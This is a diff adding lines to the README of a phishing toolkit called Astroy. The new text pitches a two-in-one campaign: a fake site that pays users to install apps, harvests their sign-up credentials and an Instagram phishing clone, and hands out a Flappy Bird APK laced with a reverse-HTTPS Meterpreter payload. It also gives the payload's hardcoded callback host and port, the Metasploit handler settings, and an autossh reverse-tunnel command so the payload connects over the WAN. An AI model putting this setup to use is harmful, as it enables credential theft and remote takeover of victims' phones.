@@ -8,11 +8,21 @@
 [<img src="https://img.shields.io/badge/OS-Linux-brightgreen.svg">]()
 [<img src="https://img.shields.io/badge/OpenSSH-v7.9-red.svg">]()
 
-> Astroy is a collection of templates that have been outsourced from different projects, combined to launch a powerful, attractive and easy to pull off phishing campaign.
+> Astroy is a collection of templates that have been outsourced from different projects, combined to launch a powerful, attractive and easy to pull off a two-in-one phishing and Android malware distribution campaign.
 
 [![asciicast](https://asciinema.org/a/fz787azSdbP34fi9iE7dpf0hd.svg)](https://asciinema.org/a/fz787azSdbP34fi9iE7dpf0hd)
 
 I made this as a tool for personal use, and did not think I would come to open-source it. As a result, a LOT of assumptions have been made when coding this, and it's gonna take you a bit of tweaking and playing around with if the OS you're running isn't configured in accordance to how the script wants. Shouldn't be too hard, though.
+
+## Why Astroy?
+
+We live in a generation where most people fall for get-rich-quick scams, but the effort required to social engineer them into falling for them is huge. Astroy sells itself as an ordinary website that pays users to install and use its Android apps, but however gathers user credentials of anyone who signs up to it, and provides a malicious ``APK`` file (a Flappy Bird game laced with a reverse-https payload) to download. If the user installs and runs the malicious game, the attacker will gain a Meterpreter session, effectively pulling off double penetration (no pun intended).
+
+The web templates include a normal sign up page, and an Instagram clone. The reason I did not add more popular templates like Facebook and Google is because their designs weren't as appealing as Instagram's. Special shout out to [thelinuxchoice](https://github.com/thelinuxchoice) for the Instagram phishing template - I modified their version a bit, removed their backend and added mine.
+
+The Flappy Bird game is hardcoded with the LHOST ``serveo.net`` and LPORT ``2345``. On Metasploit, run ``set lhost localhost`` and ``set lport 2345`` to configure the handler. Run ``autossh -tt -M 0 -o 'ServerAliveInterval 30' -o 'ServerAliveCountMax 3' -R 2345:localhost:2345 serveo.net`` to forward TCP connections, and your payload will connect over WAN.
+
+Astroy only serves as a proof of concept to what black hat hackers can achieve if they get creative. I take no responsibility whatsoever for any usage of the tool for any illegal activities by anyone else.
 
 ## Assumptions
 
@@ -80,7 +90,7 @@ Depending on how you invoke Python 3 on your system, run this command to install
 python3 -m pip install -r requirements.txt
 ```
 
-Finally, run the setup script. This simply checks whether you have internet, whether the packages are installed, whether you provided any ports as arguments and finally creates an ``astroy`` file at ``/usr/bin/`` which can be run globally from any directory. This setup script can be run without arguments like this:
+Finally, run the setup script. This simply checks whether you have internet, whether the packages it needs are installed, whether you provided any ports as arguments and finally creates an ``astroy`` file at ``/usr/bin/`` which can be run globally from any directory. This setup script can be run without arguments like this:
 
 ```sh
 python3 setup.py
